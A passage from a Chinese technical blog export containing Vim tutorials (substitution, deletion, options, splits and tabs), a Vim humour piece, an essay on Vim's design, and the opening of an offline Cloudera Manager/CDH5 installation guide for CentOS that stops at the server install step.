<p>下表给出大多数特殊字符和它们的含义：</p>
<pre><code>^                放在字符串前面，匹配行首的字；
$                放在字符串后面，匹配行尾的字；
\&lt;               匹配一个字的字头；
\&gt;               匹配一个字的字尾；
.                匹配任何单个正文字符；
[str]            匹配 str 中的任何单个字符；
[^str]           匹配任何不在 str 中的单个字符；
[a-b]            匹配 a 到 b 之间的任一字符；
*                匹配前一个字符的 0 次或多次出现；
\                转义后面的字符。
</code></pre>
<h3 id="4-5-正文替换"><a href="#4-5-正文替换" class="headerlink" title="4.5 正文替换"></a>4.5 正文替换</h3><p>利用 <code>:s</code> 命令可以实现字符串的替换。具体的用法包括：</p>
<pre><code>:%s/str1/str2/        用字符串 str2 替换行中首次出现的字符串 str1
:s/str1/str2/g        用字符串 str2 替换行中所有出现的字符串 str1
:.,$ s/str1/str2/g    用字符串 str2 替换正文当前行到末尾所有出现的字符串 str1
:1,$ s/str1/str2/g    用字符串 str2 替换正文中所有出现的字符串 str1
:g/str1/s//str2/g     功能同上
:m,ns/str1/str2/g     将从m行到n行的str1替换成str2
</code></pre>
<p>从上述替换命令可以看到：</p>
<ol>
<li><code>g</code>放在命令末尾，表示对搜索字符串的每次出现进行替换,不止匹配每行中的第一次出现；不加<code>g</code>，表示只对搜索字符串的首次出现进行替换；<code>g</code>放在命令开头，表示对正文中所有包含搜索字符串的行进行替换操作;\</li>
<li><code>s</code> 表示后面跟着一串替换的命令；</li>
<li><code>%</code> 表示替换范围是所有行，即全文。</li>
</ol>
<p>另外一个实用的命令，在Vim中统计当前文件中字符串 <code>str1</code><br>出现的次数，可用替换命令的变形：</p>
<pre><code>:%s/str1/&amp;/gn
</code></pre>
<h3 id="4-6-删除正文"><a href="#4-6-删除正文" class="headerlink" title="4.6 删除正文"></a>4.6 删除正文</h3><p>在命令模式下，同样可以删除正文中的内容。例如：</p>
<pre><code>:d                              删除光标所在行
:3d                             删除 3 行
:.,$d                           删除当前行至正文的末尾
:/str1/,/str2/d                 删除从字符串 str1 到 str2 的所有行
:g/^\(.*\)$\n\1$/d              删除连续相同的行，保留最后一行
:g/\%(^\1$\n\)\@&lt;=\(.*\)$/d     删除连续相同的行，保留最开始一行
:g/^\s*$\n\s*$/d                删除连续多个空行，只保留一行空行
:5,20s/^#//g                    删除5到20行开头的 # 注释
</code></pre>
<p>总之，Vim的初级删除命令是用 <code>d</code> ，高级删除命令可以用 <strong>正则替换</strong>的方式执行。</p>
<h3 id="4-7-恢复文件"><a href="#4-7-恢复文件" class="headerlink" title="4.7 恢复文件"></a>4.7 恢复文件</h3><p>Vim 在编辑某个文件时，会另外生成一个临时文件，这个文件的名称通常以 <code>.</code>开头，并以 <code>.swp</code> 结尾。Vim<br>在正常退出时，该文件被删除，若意外退出，而没有保存文件的最新修改内容，则可以使用恢复命令<code>:recover</code> 来恢复文件，也可以在启动Vim时用 <code>-r</code> 选项。</p>
<h3 id="4-8-选项设置"><a href="#4-8-选项设置" class="headerlink" title="4.8 选项设置"></a>4.8 选项设置</h3><p>为控制不同的编辑功能，Vim 提供了很多内部选项。利用 <code>:set</code>命令可以设置选项。基本语法为：</p>
<pre><code>:set option         设置选项 option
</code></pre>
<p>常见的功能选项包括：</p>
<pre><code>autoindent        设置该选项，则正文自动缩进
ignorecase        设置该选项，则忽略规则表达式中大小写字母的区别
number            设置该选项，则显示正文行号
ruler             设置该选项，则在屏幕底部显示光标所在行、列的位置
tabstop           设置按 Tab 键跳过的空格数。例如 :set tabstop=n，n 默认值为 8
mk                将选项保存在当前目录的 .exrc 文件中
</code></pre>
<h3 id="4-9-Shell切换"><a href="#4-9-Shell切换" class="headerlink" title="4.9 Shell切换"></a>4.9 Shell切换</h3><p>当处于编辑的对话过程中时，可能需要执行一些Linux命令。如果需要保存当前的结果，退出编辑程序，再执行所需的Linux命令，然后再回头继续编辑过程，就显得十分累赘。如果能在编辑的环境中运行Linux命令就要省事得多。在Vim中，可以用下面的命令来做到这一点：</p>
<pre><code>:!shell_command   执行完 shell_command 后回到Vim
</code></pre>
<p>这称为Shell切换。它允许执行任何可以在标准的Shell提示符下执行的命令。当这条命令执行完毕，控制返回给编辑程序。又可以继续编辑对话过程。</p>
<h3 id="4-10-分屏与标签页"><a href="#4-10-分屏与标签页" class="headerlink" title="4.10 分屏与标签页"></a>4.10 分屏与标签页</h3><h4 id="分屏"><a href="#分屏" class="headerlink" title="分屏"></a>分屏</h4><p>普通的Vim模式，打开一个Vim程序只能查看一个文件，如果想同时查看多个文件，就需要用到Vim分屏与标签页功能。</p>
<p>Vim的分屏，主要有两种方式：上下分屏（水平分屏）和左右分屏（垂直分屏），在命令模式分别敲入以下命令即可：</p>
<pre><code>:split（可用缩写 :sp）            上下分屏；
:vsplit（可用缩写 :vsp）          左右分屏。
</code></pre>
<p>另外，也可以在终端里启动vim时就开启分屏操作：</p>
<pre><code>vim -On file1 file2...   打开 file1 和 file2 ，垂直分屏
vim -on file1 file2...   打开 file1 和 file2 ，水平分屏
</code></pre>
<p>理论上，一个Vim窗口，可以分为多个Vim屏幕，切换屏幕需要用键盘快捷键，命令分别有：</p>
<pre><code>Ctrl+w+h            切换到当前分屏的左边一屏；
Ctrl+w+l            切换到当前分屏的右边一屏；
Ctrl+w+j            切换到当前分屏的下方一屏；
Ctrl+w+k            切换到当前分屏的上方一屏。
</code></pre>
<p>即键盘上的<code>h,j,k,l</code>四个Vim专用方向键，配合<code>Ctrl</code>键和<code>w</code>键（<code>window</code>的缩写），就能跳转到目标分屏。另外，也可以直接按<code>Ctrl+w+w</code>来跳转分屏，不过跳转方向则是在当前Vim窗口所有分屏中，按照<code>逆时针</code>方向跳转。</p>
<p>下面是改变尺寸的一些操作，主要是高度，对于宽度你可以使用 <code>[Ctrl+W &lt;]</code>或是 <code>[Ctrl+W &gt;]</code> ，但这可能需要最新的版本才支持。</p>
<pre><code>Ctrl+W =            让所有的屏都有一样的高度；
Ctrl+W +            增加高度；
Ctrl+W -            减少高度。
</code></pre>
<h4 id="标签页"><a href="#标签页" class="headerlink" title="标签页"></a>标签页</h4><p>Vim的标签（Tab）页，类似浏览器的标签页，一个标签页打开一个Vim的窗口，一个Vim的窗口可以支持N个分屏。在Vim中新建一个标签的命令是：</p>
<pre><code>:tabnew
</code></pre>
<p>如果要在新建标签页的同时打开一个文件，则可以在命令后面直接附带文件路径：</p>
<pre><code>:tabnew filename
</code></pre>
<p>Vim中的每个标签页有一个唯一的数字序号，第一个标签页的序号是<code>0</code>，从左向右依次加一。关于标签页有一系列操作命令，简介如下：</p>
<pre><code>:tN[ext]                跳转到上一个匹配的标签
:tabN[ext]              跳到上一个标签页
:tabc[lose]             关闭当前标签页
:tabdo                  为每个标签页执行命令
:tabe[dit]              在新标签页里编辑文件
:tabf[ind]              寻找 &#39;path&#39; 里的文件，在新标签页里编辑之
:tabfir[st]             转到第一个标签页
:tabl[ast]              转到最后一个标签页
:tabm[ove]  N           把标签页移到序号为N位置
:tabnew [filename]      在新标签页里编辑文件
:tabn[ext]              转到下一个标签页
:tabo[nly]              关闭所有除了当前标签页以外的所有标签页
:tabp[revious]          转到前一个标签页
:tabr[ewind]            转到第一个标签页
</code></pre>
]]></content>
      <categories>
        <category>工具</category>
        <category>VIM</category>
      </categories>
      <tags>
        <tag>VIM</tag>
      </tags>
  </entry>
  <entry>
    <title>vim格言</title>
    <url>/blog/tools/vim/vimgy/</url>
    <content><![CDATA[<p>本文内容来自：《学习VI和VIM编辑器第７版》附录D</p>
<p>定理：vi是完美的。</p>
<p>证明：VI是罗马数字中的6。可以被6整除又小于6的自然数是1、2、3,<code>1+2+3=6</code>。因 此6是一个完美数。因此，vi是完美的。</p>
<p>—Arthur Tateishi</p>
<p>Nathan. T. Oelger的响应：</p>
<p>因此，将上面的结果用在Vim会如何呢？</p>
<p>VIM在罗马数字中是代表<code>(1000-(5 +1))= 994</code>，等于<code>2*496+2</code>。496可以被1、2、4、8、16、31、62、124<br>与248整除，而 <code>1+2+4+8+16+31+62+124+248=496</code>,所以，496是一个完美数。</p>
<p>因此，Vim比vi完美两倍，再加上许多的好东西。</p>
<p>也就是说，Vim比完美更美好。</p>
<p>这一则格言道尽了所有真正的vi爱好者的心声：</p>
<p>对我来说，vi就是禅。使用vi,就是参禅。每一个命令都是心印。来自内心深处，非有经验不能明白。每一次使用，都会发现真理。</p>
<p>—-Satish Reddy</p>
]]></content>
      <categories>
        <category>工具</category>
        <category>VIM</category>
      </categories>
      <tags>
        <tag>VIM</tag>
      </tags>
  </entry>
  <entry>
    <title>VIM核心思想</title>
    <url>/blog/tools/vim/vimthinking/</url>
    <content><![CDATA[<h2 id="本文的由来"><a href="#本文的由来" class="headerlink" title="本文的由来"></a>本文的由来</h2><p>学习Vim一时间，一直不得要领。编辑器之神没啥学习要领，鬼也不信。我的方法就是多看书，一本书浏览一遍，不行就换一本。</p>
<p>我在《学习VI和VIM编辑器第７版中文》貌似找到了这种感觉。下面来说一说。</p>
<p>Vim的成功之处在于它抽像了编辑操作的本质，针对编辑操作的本质给出了一套解决方案。</p>
<h2 id="思想一：分模式"><a href="#思想一：分模式" class="headerlink" title="思想一：分模式"></a>思想一：分模式</h2><p>从大的角度看编辑操作分两种：</p>
<p>新录入：需要连接性的输入文本，可能还要边输入边编辑。</p>
<p>修改已有：对现有文件做边边角角的修改，主要是浏览查找。</p>
<p>从这两个角度VIM给出了两个模式：</p>
<p>插入模式：对应新录入。</p>
<p>命令模式：对应修改已有。</p>
<p>这里的命令模式包含很多地方说的“正常模式”和“命令模式”。</p>
<h3 id="一些新手误区"><a href="#一些新手误区" class="headerlink" title="一些新手误区"></a>一些新手误区</h3><p>插入模式没有编辑命令</p>
<p>开始使用VIM觉得插入模式进行编辑不方便，其实插入模式也可以有很多Ctrl或Alt配合的命令，可以自己来定义。这样插入模式就有了一般编辑器的所有功能了，还可以定义出只属于自己的功能。</p>
<p>ESC太远太难用</p>
<p>开始觉得ESC使用不方便，模式的切换太频繁，ESC都按到吐了。其实还有其它键也等同ESC，比如Ctrl+[，再觉得不方便还可以自己定义。我看网上有很多人定义jj键，就是在插入模式连续输入jj就可以退到命令模式。</p>
<p>模式切换太频繁</p>
<p>如果你用VIM要频繁的切换模式，说明你没有好好学习VIM。插入模式一般不用切换到命令模式，常用命令可以自己定义快捷键。你应该学学<a href="/ide/vim/vimdiary/vimmap.php">Vim按键映射(Map)</a></p>
<h2 id="思想二：抽像编辑操作"><a href="#思想二：抽像编辑操作" class="headerlink" title="思想二：抽像编辑操作"></a>思想二：抽像编辑操作</h2><p>首先看一下VIM的一般命令模式：</p>
<pre><code>(编辑命令)(次数)(光标命令)
</code></pre>
<p>或</p>
<pre><code>(次数)(编辑命令)(光标命令)
</code></pre>
<p>光标命令是指光标移动的命令，如最常见的<code>hjkl</code>。</p>
<p>那一般命令模式的意思就是：“编辑指定文本几次”。</p>
<p>所以只要学会编辑命令和光标移动命令，其它的都是一些组合出的功能了。</p>
<h3 id="VIM帮助"><a href="#VIM帮助" class="headerlink" title="VIM帮助"></a>VIM帮助</h3><p>这里不会对命令进行详细说明，详细了解最好的还是用vim的帮助，学会vim帮助是学好vim的必须功课。</p>
<p>比如<code>:h d</code>会跳到vim命令d的帮助部分:</p>
<pre><code>[&quot;x]d&#123;motion&#125;        Delete text that &#123;motion&#125; moves over [into register
            x].  See below for exceptions
</code></pre>
<p>[“x]是可选的寄存器选项，以中括号括起来的是可选的意思，里面是默认值。</p>
<p>{motiont}和(光标命令)一样，是指确认处理哪些文本的光标命令。</p>
<h3 id="编辑命令"><a href="#编辑命令" class="headerlink" title="编辑命令"></a>编辑命令</h3><p>编辑命令比较少，所以先说。</p>
<p>编辑操作一般就几种：删除、复制、剪切、粘贴、修改。</p>
<p>在VIM中对应的命令：</p>
<ul>
<li>删除：d[elete]或x，x其它是dl的简写，可以看帮助。</li>
<li>复制：y[ank]，很多地方翻译为「拔」，把内容放到寄存器。</li>
<li>剪切：VIM里删除即是剪切，删除的内容会放到寄存器。</li>
<li>粘贴：p[ut]，放置，把寄存器里的内容放到指定位置。</li>
<li>修改：c[hange]、s[ub]、r{place]，将内容放入寄存器，并插入新内容。</li>
</ul>
<p>所以vim命令第一个字母一般都是ydpc里的一个。</p>
<h3 id="光标移动命令"><a href="#光标移动命令" class="headerlink" title="光标移动命令"></a>光标移动命令</h3><p>基本的上下左右对应<code>hjkl</code>，这也不是什么缩写，只是最快捷的键方式。</p>
<p>行内移动：</p>
<ul>
<li>w：右移光标到下一个字的开头；</li>
<li>e：右移光标到一个字的末尾；</li>
<li>b：左移光标到前一个字的开头；</li>
<li>0：数字０，左移光标到本行的开始；</li>
<li>$：右移光标，到本行的末尾；</li>
<li>^：移动光标，到本行的第一个非空字符。</li>
</ul>
<p>翻页：</p>
<ul>
<li>ctrl+f[orward]：在文件中前移一页（相当于 page down）；</li>
<li>ctrl+b[ackward]：在文件中后移一页（相当于 page up）；</li>
</ul>
<p>按其它方式移动：</p>
<ul>
<li>(&#x2F;)：移动到 前&#x2F;后 句 的开始；</li>
<li>{&#x2F;}：跳转到 当前&#x2F;下一个 段落 的开始。</li>
<li>gg：将光标定位到文件第一行起始位置；</li>
<li>G将光标定位到文件最后一行起始位置；</li>
<li>NG或Ngg:将光标定位到第 N 行的起始位置。</li>
<li>*：当光标停留在一个单词上，*<br>键会在文件内搜索该单词，并跳转到下一处；</li>
<li>#当光标停留在一个单词上，# 在文件内搜索该单词，并跳转到上一处；</li>
<li>g_ ：到本行最后一个不是 blank 字符的位置。</li>
<li>fa：到下一个为 a 的字符处，你也可以fs到下一个为s的字符。</li>
<li>t,：到逗号前的第一个字符。逗号可以变成其它字符。</li>
<li>F&#x2F;T：和 f 和 t 一样，只不过是相反方向;</li>
</ul>
<h3 id="一些组合示例"><a href="#一些组合示例" class="headerlink" title="一些组合示例"></a>一些组合示例</h3><ul>
<li>dw:删除光标右侧的字；</li>
<li>3dw:删除光标右侧的 3 个字；</li>
<li>5db:删除光标左侧的 5 个字；</li>
<li>3dd:删除（剪切） 3 行内容，并去除空隙；</li>
<li>d$:从当前光标起删除字符直到行的结束；</li>
<li>d0:从当前光标起删除字符直到行的开始；</li>
<li>c$:用输入的正文替换从光标开始到本行末尾的所有字符；</li>
<li>c0:用输入的正文替换从本行开头到光标的所有字符。</li>
<li>5yy:复制 5 行内容到内存缓冲区；</li>
<li>ncw:用输入的正文替换光标右侧的 n 个字；</li>
</ul>
<h2 id="以冒号-开头的命令"><a href="#以冒号-开头的命令" class="headerlink" title="以冒号(:)开头的命令"></a>以冒号(:)开头的命令</h2><p>如果要了解以冒号(:)开头的这些命令，还要了解一下vi的历史，vi是对unix的ex行编辑器的扩展，对ex可视化产物。所以vi里的精髓还是ex这些命令。</p>
<p>vim里的以冒号(:)开头的这些命令大多是ex的命令，所以学好vim还要学ex的命令，你也可以以为是学vim，其实是在学ex。</p>
<p>ex的常用命令格式：</p>
<pre><code>:(行地址符)(命令)
</code></pre>
<h3 id="行地址"><a href="#行地址" class="headerlink" title="行地址"></a>行地址</h3><p>对于每一个 ex 编辑命令，必须给出 ex 所要编辑的行。对于 ex 的 move 和<br>copy 命令，还需要给出 ex 移动或复制文本的目标位置。</p>
<p>可以使用下面几种方式来指定行地址：</p>
<p>[1] 使用明确的行号。</p>
<p>[2] 使用能帮助你指定相对于文件中当前位置的行号的符号。</p>
<p>[3] 使用搜索模式作为标识所要编辑的行的地址。</p>
<p>这里就不说太详细了，列一此常用的ex命令：</p>
<h3 id="文件操作"><a href="#文件操作" class="headerlink" title="文件操作"></a>文件操作</h3><ul>
<li>:e file2 &#x2F;&#x2F;使用 :e 进入文件 file2 中</li>
<li>:w &#x2F;&#x2F;把缓冲区写（保存）到文件中但不退出</li>
<li>:q &#x2F;&#x2F;退出编辑器</li>
<li>:wq &#x2F;&#x2F;写文件并退出编辑器，即使没有修改文件，写操作也会无条件的进行</li>
<li>:x &#x2F;&#x2F;写文件并退出编辑器，只有修改了文件，写操作才能进行</li>
<li>:q! &#x2F;&#x2F;在退出时不影响原来的文本</li>
<li>: 230 , $ w newfile &#x2F;&#x2F;将从第230行到文件末尾的文本保存到“newfile”中</li>
<li>: . , 600 w newfile &#x2F;&#x2F;将从当前行到第600行的文本保存到“newfile”中</li>
</ul>
<p>其它命令：</p>
<ul>
<li>:3,18d &#x2F;&#x2F;d[elete]删除3~18行</li>
<li>:160,224m23 &#x2F;&#x2F;m[ove]移动160~224行到23行的下面</li>
<li>:23,29co100 &#x2F;&#x2F;co[py]复制23~29行并把它们粘贴到100行的后面</li>
<li>: . , $d &#x2F;&#x2F;删除从当前行到文件末尾之间的文本</li>
<li>:%d &#x2F;&#x2F;删除文件中所有行</li>
<li>:%t$ &#x2F;&#x2F;复制所有行并把它们粘贴到文件的尾部</li>
<li>: 226 , $m . -2 &#x2F;&#x2F;把226行到文件末尾的文本移动到当前行上面的第二行</li>
<li>:&#x2F;pattern&#x2F;d &#x2F;&#x2F;删除下一个包含模式pattern的行</li>
<li>:1 , 3d | s&#x2F;thier&#x2F;their&#x2F; &#x2F;&#x2F;把1到3行删除，然后在当前行进行替换</li>
<li>:1 ,5 m 10 | g&#x2F;pattern&#x2F;nu<br>&#x2F;&#x2F;把1到5行移动到第10行的后面，然后显示所有包含模式pattern的行和行号</li>
</ul>
<h2 id="总结一下"><a href="#总结一下" class="headerlink" title="总结一下"></a>总结一下</h2><p>vi核心是ex，多学ex的命令绝对有好处。</p>
<p>掌握vi的几个编辑命令和10几个光标移动命令，组合使用实现名称功能。</p>
<p>自己的vim才是好vim，学会用map定义自己的快捷键。</p>
<p>做完这些基本就完成了常用功能的学习，再学点要用的插件或编写插件，其它编辑器基本就不用了。</p>
<p>最后再来一句，vi的成功源于ex的强大，但不得不说模式确实是点睛之笔。</p>
]]></content>
      <categories>
        <category>工具</category>
        <category>VIM</category>
      </categories>
      <tags>
        <tag>VIM</tag>
      </tags>
  </entry>
  <entry>
    <title>(转)离线安装Cloudera Manager 5和CDH5</title>
    <url>/blog/bigdata/hadoop/cdh/cdh5install/</url>
    <content><![CDATA[<h2 id="关于CDH和Cloudera-Manager"><a href="#关于CDH和Cloudera-Manager" class="headerlink" title="关于CDH和Cloudera Manager"></a>关于CDH和Cloudera Manager</h2><p>CDH (Cloudera’s Distribution, including Apache Hadoop)，是Hadoop众多分支中的一种，由Cloudera维护，基于稳定版本的Apache Hadoop构建，并集成了很多补丁，可直接用于生产环境。</p>
<p>Cloudera Manager则是为了便于在集群中进行Hadoop等大数据处理相关的服务安装和监控管理的组件，对集群中主机、Hadoop、Hive、Spark等服务的安装配置管理做了极大简化。</p>
<h2 id="系统环境"><a href="#系统环境" class="headerlink" title="系统环境"></a>系统环境</h2><ul>
<li>实验环境：Mac下VMware虚拟机</li>
<li>操作系统：CentOS 6.5 x64 (至少内存2G以上，这里内存不够的同学建议还是整几台真机配置比较好，将CDH的所有组件全部安装会占用很多内存，我已开始设置的虚拟机内存是1G，安装过程中直接卡死了)</li>
<li>Cloudera Manager：5.1.3</li>
<li>CDH: 5.1.3</li>
</ul>
<h2 id="安装说明"><a href="#安装说明" class="headerlink" title="安装说明"></a>安装说明</h2><p>官方参考文档：</p>
<p><a href="http://www.cloudera.com/content/cloudera/en/documentation/cloudera-manager/v5-latest/Cloudera-Manager-Installation-Guide/cm5ig_install_path_C.html">http://www.cloudera.com/content/cloudera/en/documentation/cloudera-manager/v5-latest/Cloudera-Manager-Installation-Guide/cm5ig_install_path_C.html</a></p>
<p>官方共给出了3中安装方式：</p>
<p>第一种方法必须要求所有机器都能连网，由于最近各种国外的网站被墙的厉害，我尝试了几次各种超时错误，巨耽误时间不说，一旦失败，重装非常痛苦。</p>
<p>第二种方法下载很多包。</p>
<p>第三种方法对系统侵入性最小,最大优点可实现全离线安装，而且重装什么的都非常方便。后期的集群统一包升级也非常好。这也是我之所以选择离线安装的原因。</p>
<h2 id="相关包的下载地址"><a href="#相关包的下载地址" class="headerlink" title="相关包的下载地址"></a>相关包的下载地址</h2><p>Cloudera Manager下载地址：<br><a href="http://archive.cloudera.com/cm5/cm/5/cloudera-manager-el6-cm5.1.3_x86_64.tar.gz%EF%BC%8C">http://archive.cloudera.com/cm5/cm/5/cloudera-manager-el6-cm5.1.3_x86_64.tar.gz，</a><br>下载信息：<br><a href="http://www.cloudera.com/content/cloudera/en/documentation/cloudera-manager/v5-latest/Cloudera-Manager-Version-and-Download-Information/Cloudera-Manager-Version-and-Download-Information.html#cmvd_topic_1">http://www.cloudera.com/content/cloudera/en/documentation/cloudera-manager/v5-latest/Cloudera-Manager-Version-and-Download-Information/Cloudera-Manager-Version-and-Download-Information.html#cmvd_topic_1</a></p>
<p>CDH安装包地址：<a href="http://archive.cloudera.com/cdh5/parcels/latest/%EF%BC%8C%E7%94%B1%E4%BA%8E%E6%88%91%E4%BB%AC%E7%9A%84%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E4%B8%BACentOS6.5%EF%BC%8C%E9%9C%80%E8%A6%81%E4%B8%8B%E8%BD%BD%E4%BB%A5%E4%B8%8B%E6%96%87%E4%BB%B6%EF%BC%9A">http://archive.cloudera.com/cdh5/parcels/latest/，由于我们的操作系统为CentOS6.5，需要下载以下文件：</a></p>
<ul>
<li>CDH-5.1.3-1.cdh5.1.3.p0.12-el6.parcel</li>
<li>CDH-5.1.3-1.cdh5.1.3.p0.12-el6.parcel.sha1</li>
<li>manifest.json</li>
</ul>
<p>注意：与CDH4的不同，原来安装CDH4的时候还需要下载IMPALA、Cloudera Search(SOLR)，CDH5中将他们包含在一起了，所以只需要下载一个CDH5的包就可以了。</p>
<h2 id="准备工作：系统环境搭建"><a href="#准备工作：系统环境搭建" class="headerlink" title="准备工作：系统环境搭建"></a>准备工作：系统环境搭建</h2><p>以下操作均用root用户操作。</p>
<h3 id="1-网络配置-所有节点"><a href="#1-网络配置-所有节点" class="headerlink" title="1. 网络配置(所有节点)"></a>1. 网络配置(所有节点)</h3><p><code>vi /etc/sysconfig/network</code>修改hostname：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">NETWORKING=yes</span><br><span class="line">HOSTNAME=n1</span><br></pre></td></tr></table></figure>
<p>通过<code>service network restart</code>重启网络服务生效。</p>
<p><code>vi /etc/hosts</code>,修改ip与主机名的对应关系</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">192.168.1.106   n1</span><br><span class="line">192.168.1.107   n2</span><br><span class="line">192.168.1.108   n3</span><br></pre></td></tr></table></figure>

<p>注意：这里需要将每台机器的ip及主机名对应关系都写进去，本机的也要写进去，否则启动Agent的时候会提示hostname解析错误。</p>
<h3 id="2-打通SSH，设置ssh无密码登陆（所有节点）"><a href="#2-打通SSH，设置ssh无密码登陆（所有节点）" class="headerlink" title="2.打通SSH，设置ssh无密码登陆（所有节点）"></a>2.打通SSH，设置ssh无密码登陆（所有节点）</h3><p>在主节点上执行<code>ssh-keygen -t rsa</code>一路回车，生成无密码的密钥对。</p>
<p>将公钥添加到认证文件中：<code>cat ~/.ssh/id_rsa.pub &gt;&gt; ~/.ssh/authorized_keys</code>，并设置authorized_keys的访问权限：<code>chmod 600 ~/.ssh/authorized_keys</code>。</p>
<p>scp文件到所有datenode节点：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">scp ~/.ssh/authorized_keys root@n2:~/.ssh/</span><br></pre></td></tr></table></figure>

<p>测试：在主节点上ssh n2，正常情况下，不需要密码就能直接登陆进去了。</p>
<h3 id="3-安装Oracle的Java（所有节点）"><a href="#3-安装Oracle的Java（所有节点）" class="headerlink" title="3.安装Oracle的Java（所有节点）"></a>3.安装Oracle的Java（所有节点）</h3><p>CentOS，自带OpenJdk，不过运行CDH5需要使用Oracle的Jdk，需要Java 7的支持。</p>
<p>卸载自带的OpenJdk，使用<code>rpm -qa | grep java</code>查询java相关的包，使用<code>rpm -e --nodeps 包名</code>卸载之。</p>
<p>去Oracle的官网下载jdk的rpm安装包，并使用<code>rpm -ivh 包名</code>安装之。</p>
<p>由于是rpm包并不需要我们来配置环境变量，我们只需要配置一个全局的JAVA_HOME变量即可，执行命令：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo &quot;JAVA_HOME=/usr/java/latest/&quot; &gt;&gt; /etc/environment</span><br></pre></td></tr></table></figure>

<h3 id="4-安装配置MySql（主节点）"><a href="#4-安装配置MySql（主节点）" class="headerlink" title="4.安装配置MySql（主节点）"></a>4.安装配置MySql（主节点）</h3><p>通过<code>yum install mysql-server</code>安装mysql服务器。<code>chkconfig mysqld on</code>设置开机启动，并<code>service mysqld start</code>启动mysql服务，并根据提示设置root的初试密码：<code>mysqladmin -u root password &#39;xxxx&#39;</code>。</p>
<p><code>mysql -uroot -pxxxx</code>进入mysql命令行，创建以下数据库：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#hive</span><br><span class="line">create database hive DEFAULT CHARSET utf8 COLLATE utf8_general_ci;</span><br><span class="line">#activity monitor</span><br><span class="line">create database amon DEFAULT CHARSET utf8 COLLATE utf8_general_ci;</span><br></pre></td></tr></table></figure>

<p>设置root授权访问以上所有的数据库：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#授权root用户在主节点拥有所有数据库的访问权限</span><br><span class="line">grant all privileges on *.* to &#x27;root&#x27;@&#x27;n1&#x27; identified by &#x27;xxxx&#x27; with grant option;</span><br><span class="line">flush privileges;</span><br></pre></td></tr></table></figure>

<p>官方MySql配置文档：</p>
<p><a href="http://www.cloudera.com/content/cloudera/en/documentation/cloudera-manager/v5-latest/Cloudera-Manager-Installation-Guide/cm5ig_mysql.html#cmig_topic_5_5">http://www.cloudera.com/content/cloudera/en/documentation/cloudera-manager/v5-latest/Cloudera-Manager-Installation-Guide/cm5ig_mysql.html#cmig_topic_5_5</a></p>
<h3 id="5-关闭防火墙和SELinux"><a href="#5-关闭防火墙和SELinux" class="headerlink" title="5. 关闭防火墙和SELinux"></a>5. 关闭防火墙和SELinux</h3><p>注意： 需要在所有的节点上执行，因为涉及到的端口太多了，临时关闭防火墙是为了安装起来更方便，安装完毕后可以根据需要设置防火墙策略，保证集群安全。</p>
<p>关闭防火墙：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">service iptables stop （临时关闭）</span><br><span class="line">chkconfig iptables off （重启后生效）</span><br></pre></td></tr></table></figure>

<p>关闭SELINUX（实际安装过程中发现没有关闭也是可以的，不知道会不会有问题，还需进一步进行验证）:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">setenforce 0 （临时生效）</span><br><span class="line">修改 /etc/selinux/config 下的 SELINUX=disabled （重启后永久生效）</span><br></pre></td></tr></table></figure>

<h3 id="6-所有节点配置NTP服务"><a href="#6-所有节点配置NTP服务" class="headerlink" title="6. 所有节点配置NTP服务"></a>6. 所有节点配置NTP服务</h3><p>集群中所有主机必须保持时间同步，如果时间相差较大会引起各种问题。 具体思路如下：</p>
<p>master节点作为ntp服务器与外界对时中心同步时间，随后对所有datanode节点提供时间同步服务。</p>
<p>所有datanode节点以master节点为基础同步时间。</p>
<p>所有节点安装相关组件：<code>yum install ntp</code>。完成后，配置开机启动：<code>chkconfig ntpd on</code>,检查是否设置成功：<code>chkconfig --list ntpd</code>其中2-5为on状态就代表成功。</p>
<p>主节点配置</p>
<p>在配置之前，先使用ntpdate手动同步一下时间，免得本机与对时中心时间差距太大，使得ntpd不能正常同步。这里选用65.55.56.206作为对时中心,<code>ntpdate -u 65.55.56.206</code>。</p>
<p>ntp服务只有一个配置文件，配置好了就OK。 这里只给出有用的配置，不需要的配置都用#注掉，这里就不在给出：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">driftfile /var/lib/ntp/drift</span><br><span class="line">restrict 127.0.0.1</span><br><span class="line">restrict -6 ::1</span><br><span class="line">restrict default nomodify notrap </span><br><span class="line">server 65.55.56.206 prefer</span><br><span class="line">includefile /etc/ntp/crypto/pw</span><br><span class="line">keys /etc/ntp/keys</span><br></pre></td></tr></table></figure>

<p>配置文件完成，保存退出，启动服务，执行如下命令：<code>service ntpd start</code></p>
<p>检查是否成功，用ntpstat命令查看同步状态，出现以下状态代表启动成功：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">synchronised to NTP server () at stratum 2</span><br><span class="line">time correct to within 74 ms</span><br><span class="line">polling server every 128 s</span><br></pre></td></tr></table></figure>

<p>如果出现异常请等待几分钟，一般等待5-10分钟才能同步。</p>
<p>配置ntp客户端（所有datanode节点）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">driftfile /var/lib/ntp/drift</span><br><span class="line">restrict 127.0.0.1</span><br><span class="line">restrict -6 ::1</span><br><span class="line">restrict default kod nomodify notrap nopeer noquery</span><br><span class="line">restrict -6 default kod nomodify notrap nopeer noquery</span><br><span class="line">#这里是主节点的主机名或者ip</span><br><span class="line">server n1</span><br><span class="line">includefile /etc/ntp/crypto/pw</span><br><span class="line">keys /etc/ntp/keys</span><br></pre></td></tr></table></figure>

<p>ok保存退出，请求服务器前，请先使用ntpdate手动同步一下时间：<code>ntpdate -u n1</code> (主节点ntp服务器)</p>
<p>这里可能出现同步失败的情况，请不要着急，一般是本地的ntp服务器还没有正常启动，一般需要等待5-10分钟才可以正常同步。启动服务：<code>service ntpd start</code></p>
<p>因为是连接内网，这次启动等待的时间会比master节点快一些，但是也需要耐心等待一会儿。</p>
<h2 id="正式开工"><a href="#正式开工" class="headerlink" title="正式开工"></a>正式开工</h2><p>安装Cloudera Manager Server 和Agent</p>
<p><strong>主节点解压安装</strong></p>
